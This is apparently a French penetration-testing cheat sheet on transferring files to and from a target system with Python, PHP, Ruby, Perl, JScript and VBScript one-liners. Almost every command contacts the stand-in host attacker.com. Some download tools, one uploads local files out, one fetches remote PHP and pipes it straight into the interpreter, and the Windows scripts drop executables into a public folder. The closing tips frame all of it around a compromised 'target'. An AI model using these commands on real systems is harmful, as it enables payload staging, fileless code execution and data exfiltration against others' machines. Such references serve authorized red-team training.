# Transferts à l'Aide de Code

Les langages de programmation offrent des moyens flexibles pour transférer des fichiers, souvent utiles quand les outils standards ne sont pas disponibles.

## Python

### Téléchargement de Fichiers

```python
# Python 2
python -c 'import urllib;urllib.urlretrieve("http://attacker.com/file.bin", "file.bin")'

# Python 3
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://attacker.com/file.bin", "file.bin")'

# Avec requests (si disponible)
python3 -c 'import requests;open("file.bin","wb").write(requests.get("http://attacker.com/file.bin").content)'
```

### Envoi de Fichiers

```python
# Avec requests
python3 -c 'import requests;requests.post("http://attacker.com/upload", files={"file":open("file.bin","rb")})'

# Serveur HTTP simple pour réception
python3 -m http.server
```

## PHP

### Téléchargement de Fichiers

```php
# Avec file_get_contents
php -r '$file = file_get_contents("http://attacker.com/file.bin"); file_put_contents("file.bin", $file);'

# Avec fopen
php -r 'const BUFFER = 1024; $fremote = fopen("http://attacker.com/file.bin", "rb"); $flocal = fopen("file.bin", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

### Exécution sans Fichier

```php
# Télécharger et exécuter directement
php -r '$lines = @file("http://attacker.com/script.php"); foreach ($lines as $line) { echo $line; }' | php
```

## Ruby

### Téléchargement de Fichiers

```ruby
# Téléchargement simple
ruby -e 'require "net/http"; File.write("file.bin", Net::HTTP.get(URI.parse("http://attacker.com/file.bin")))'

# Avec authentification
ruby -e 'require "net/http"; uri = URI.parse("http://attacker.com/file.bin"); req = Net::HTTP::Get.new(uri); req.basic_auth "user", "pass"; response = Net::HTTP.start(uri.hostname, uri.port) {|http| http.request(req)}; File.write("file.bin", response.body)'
```

## Perl

### Téléchargement de Fichiers

```perl
# Avec LWP::Simple
perl -e 'use LWP::Simple; getstore("http://attacker.com/file.bin", "file.bin");'

# Alternative sans module supplémentaire
perl -e 'use IO::Socket::INET; $client = new IO::Socket::INET(PeerAddr => "attacker.com:80"); print $client "GET /file.bin HTTP/1.0\r\n\r\n"; open(FILE, ">file.bin"); while(<$client>) { print FILE $_; } close FILE;'
```

## JavaScript (Windows)

Utile sur les systèmes Windows sans PowerShell.

### Téléchargement avec cscript.exe

```javascript
// wget.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```cmd
# Exécution
cscript.exe /nologo wget.js http://attacker.com/file.exe C:\Users\Public\file.exe
```

## VBScript (Windows)

Alternative à JavaScript sur anciens systèmes Windows.

```vbscript
' wget.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```cmd
# Exécution
cscript.exe /nologo wget.vbs http://attacker.com/file.exe C:\Users\Public\file.exe
```

## Points Importants

- Vérifier les langages disponibles sur le système cible
- Python est souvent présent sur les systèmes Linux modernes
- PHP est courant sur les serveurs web
- JavaScript/VBScript fonctionnent sur pratiquement tous les systèmes Windows
- Certains systèmes restreints peuvent bloquer l'accès réseau direct dans les scripts
- Pour les environnements Windows, préférer PowerShell si disponible